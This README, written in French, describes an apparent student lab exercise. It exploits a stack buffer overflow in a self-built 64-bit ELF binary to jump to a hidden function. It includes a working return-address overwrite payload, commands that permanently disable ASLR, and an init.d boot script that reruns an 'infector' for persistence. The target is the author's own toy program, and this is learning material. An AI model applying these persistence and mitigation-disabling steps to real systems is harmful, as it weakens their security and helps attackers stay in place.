
# README : Exploit (buffer-overflow) et ELF Infector

## 1. Introduction

Ce projet permet d'exploiter une vulnérabilité de type **buffer overflow** dans un programme ELF 64 bits (`vuln64`) afin de rediriger l'exécution vers une fonction secrète (`secretFunction`). Ensuite, nous avons injecté un code malveillant dans le programme ELF pour garantir la **persistance** de l'exploit, même après un redémarrage du système.

## 2. Objectifs

- Exploiter la vulnérabilité de buffer overflow dans `vuln64`.
- Créer un script Python (`exploit.py`) pour automatiser l'exploit.
- Implémenter un **infector** (`infector.py`) pour injecter du code malveillant dans le fichier ELF et assurer la persistance de l'exploit.
- Gérer la persistance après un redémarrage et après recompilation du binaire.
- Désactiver l'ASLR pour garantir la stabilité des adresses mémoire.

NB: je me suis aider des sites qui parlais du elf infector pour comprendre. c'etais un peu dificile de comprendre. ainsi  que de l'ia pour du debugage.

## 3. Prérequis

- Les outils nécessaires : gcc, objdump, gdb, readelf, python3
- Un fichier binaire vulnérable vuln64 pour tester l'injection
- Python 3.x installé pour exécuter les scripts `exploit.py` et `infector.py`
- Accès administrateur pour désactiver l'ASLR et gérer les configurations du système

## 4. Étapes d'implémentation

### 4.1. Vulnérabilité Buffer Overflow
J'ai créer un binaire moi meme pour tester ma comprehension
Le programme `vuln64.c` contient une vulnérabilité de buffer overflow qui permet d'écraser l'adresse de retour pour exécuter une fonction secrète, `secretFunction`.

### 4.2. Compilation du Programme

Le programme est compilé avec les options suivantes pour désactiver la protection de la pile et activer l'exécution de la pile:

```bash
gcc -o vuln64 vuln.c -fno-stack-protector -z execstack -no-pie
```


### 4.3. Exploit de Buffer Overflow

Le but est de déclencher un buffer overflow pour écraser l'adresse de retour et rediriger l'exécution vers `secretFunction`.

#### Script Python `exploit.py` :

Le script `exploit.py` génère un payload qui remplit le buffer de 32 octets, écrase la valeur de `%rbp`, et place l'adresse de `secretFunction` dans la pile.

```python
# exploit.py
import sys

# Remplir le buffer de 32 octets, 8 octets pour %rbp, puis l'adresse de secretFunction qu'on trouve en faisant objdump -d vuln64 | gre>
payload = b"A" * 32 + b"B" * 8 + b"\x46\x11\x40\x00\x00\x00\x00\x00" +  b"\xbb\x11\x40\x00\x00\x00\x00\x00"

sys.stdout.buffer.write(payload)

```

Le payload consiste en :
- 32 octets de `A` pour remplir le buffer.
- 8 octets de `B` pour écraser le `%rbp` (optionnel mais recommandé).
- L'adresse de `secretFunction` en little-endian (`\x46\x11\x40\x00\x00\x00\x00\x00`).

#### Exécution de l'exploit :

```bash
python3 exploit.py | ./vuln64
```

**Résultat attendu :


### 4.4. Désactivation de l'ASLR

L'ASLR (Address Space Layout Randomization) empêche l'exploit de fonctionner correctement car il change les adresses à chaque exécution. Pour garantir la stabilité de l'exploit, nous avons désactivé l'ASLR de manière permanente.

#### Désactivation temporaire de l'ASLR :

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

#### Désactivation permanente de l'ASLR :

1. Ouvrir le fichier `/etc/sysctl.conf` :
   ```bash
   sudo nano /etc/sysctl.conf
   ```
2. Ajoute la ligne suivante :
   ```bash
   kernel.randomize_va_space=0
   ```
3. Recharge la configuration :
   ```bash
   sudo sysctl -p
   ```

### 4.5. Création de l'Infector

L'**infector** est responsable de l'infection du programme ELF, permettant à l'exploit de persister après un redémarrage ou une recompilation.

#### Script Python `infector.py` :

Le script `infector.py` doit modifier le binaire ELF afin d'injecter du code malveillant ou des modifications d'adresse pour que le programme exécute `secretFunction` même après un redémarrage ou une recompilation.


#### Explication de l'injecteur :

1. Le fichier binaire `vuln64` est lu dans `binary_data`.
2. L'adresse de `secretFunction` est injectée dans l'adresse de retour.
3. Le fichier infecté est écrit dans un nouveau fichier, par exemple `vuln64.infected`.

#### Exécution de l'infection :

```bash
python3 infector.py
```


### 4.6. Test de l'Infection

Après avoir infecté le binaire, tu peux le tester en exécutant le fichier `vuln64` :

```bash
./vuln64
```



### 4.7. Assurer la Persistance Après Redémarrage

Pour garantir que l'infecteur fonctionne après un redémarrage, voici une méthode qui crée un script d'initialisation qui réexécute l'infecteur à chaque démarrage du système.

#### Créer un script d'initialisation :

1. Créer un script dans `/etc/init.d/` pour exécuter l'infecteur au démarrage :
   
   ```bash
   sudo nano /etc/init.d/run_infect
   ```

2. Ajouter le contenu suivant dans le fichier :

   ```bash
   #!/bin/bash
   python3 /home/user/path/to/infector.py
   ```

3. Rendre ce fichier exécutable :

   ```bash
   sudo chmod +x /etc/init.d/run_infect
   ```

4. Ajouter le script au démarrage :

   ```bash
   sudo update-rc.d run_infect defaults
   ```

Cela garantira que l'infecteur sera exécuté à chaque démarrage du système, maintenant ainsi la persistance de l'exploit.

---

## 5. Conclusion

Ce projet démontre comment exploiter une vulnérabilité de buffer overflow dans un programme ELF 64 bits et injecter un code malveillant dans le binaire pour garantir la persistance de l'exploit même après un redémarrage ou une recompilation.

- j'ai utilisé **Python** pour automatiser l'exploitation et l'infection du programme ELF.
- j'ai désactivé l'ASLR pour garantir la stabilité des adresses mémoire.
- j'ai utilisé un script d'initialisation pour garantir la persistance après redémarrage.

## 6. Capture d'écran

1. **Exploit réussi** : Capture d'écran montrant le message "Congratulations!" après l'exécution du payload.

2. **infection réussi** : 


### Fichiers fournis :

- **`vuln.c`** : Code source vulnérable.
- **`vuln64`**
- **`exploit.py`** : Script pour exploiter le buffer overflow.
- **`infector.py`** : Script pour injecter le payload et maintenir la persistance.
